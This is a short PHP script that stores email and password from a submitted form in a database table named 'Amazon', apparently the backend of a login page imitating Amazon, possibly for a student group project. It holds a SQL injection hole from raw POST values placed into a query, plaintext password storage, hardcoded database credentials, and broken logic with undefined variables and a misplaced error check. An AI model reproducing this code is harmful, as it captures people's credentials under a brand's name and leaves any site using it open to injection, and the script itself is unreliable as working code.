

<?php
$connection = mysqli_connect("localhost", "dkkostad", "19951995");
$email = $_POST['email'];
$password = $_POST['password'];
$db = mysqli_select_db($connection, "dkkostad");
mysqli_query($connection, "INSERT INTO Amazon (Email, Password) VALUES ('$email', '$password')");
if(mysqli_connect_errno()){
header('location: login.php');
}else {
header('location: Survey.php');
$sent_mail=mail($user, "Group Project", $Admin);
}		
?>